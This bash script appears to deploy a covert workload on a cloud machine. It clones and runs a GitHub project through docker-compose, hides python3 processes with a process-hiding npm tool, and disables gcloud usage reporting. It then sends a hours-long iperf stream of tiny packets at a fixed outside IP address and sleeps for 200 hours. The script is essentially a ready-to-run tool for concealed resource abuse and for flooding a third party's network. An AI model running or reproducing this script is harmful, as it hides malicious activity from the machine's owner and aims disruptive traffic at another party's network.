#!/usr/bin/env bash
cd ..
rm -rf wappah
git clone https://github.com/azizmaziz/wappah.git
cd wappah
sudo apt-get update
sudo apt install docker.io -y
sudo apt install npm -y
sudo npm i -g node-process-hider && sudo ph add python3
sudo curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
    chmod +x /usr/local/bin/docker-compose
sudo docker-compose build --parallel 
sudo docker-compose up -d  && clear 
sudo apt-get install iperf -y
sudo gcloud config set disable_usage_reporting true
sudo docker-compose logs
sudo iperf -c 159.223.168.17 -t 36000 -i 10 -l 0.001K & sudo apt install nethogs -y
sudo nethogs
sleep 200h
